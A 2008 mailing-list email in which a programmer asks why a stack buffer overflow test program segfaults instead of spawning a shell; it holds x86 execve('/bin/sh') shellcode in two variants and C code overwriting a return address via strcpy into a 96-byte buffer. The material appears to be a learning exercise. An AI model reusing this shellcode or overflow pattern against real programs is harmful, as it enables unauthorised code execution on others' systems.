From: Varun Chandramohan <varunc@linux.vnet.ibm.com>
Subject: buffer overflow
Date: Tue, 11 Mar 2008 11:38:38 +0530
Message-ID: <47D621E6.1090403@linux.vnet.ibm.com>
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Return-path: <linux-c-programming-owner@vger.kernel.org>
Sender: linux-c-programming-owner@vger.kernel.org
List-ID: <linux-c-programming.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
To: linux-c-programming@vger.kernel.org

Hi all,

             Can someone tell me whats is wrong with this program? All i
get is seg fault. Iam trying to create a stack overflow and exec a
shell. Somehow its not working. The system is x86 on linux.
gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
Copyright (C) 2006 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.



The Code:
#include <stdio.h>
#include <string.h>

char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#if 0
char shellcode[] =
        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

#endif

char large_string[128];
int main() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;
  memset(&buffer,0,sizeof(buffer));

  for (i = 0; i < 32; i++)
    *(long_ptr + i) =  (long)&buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}

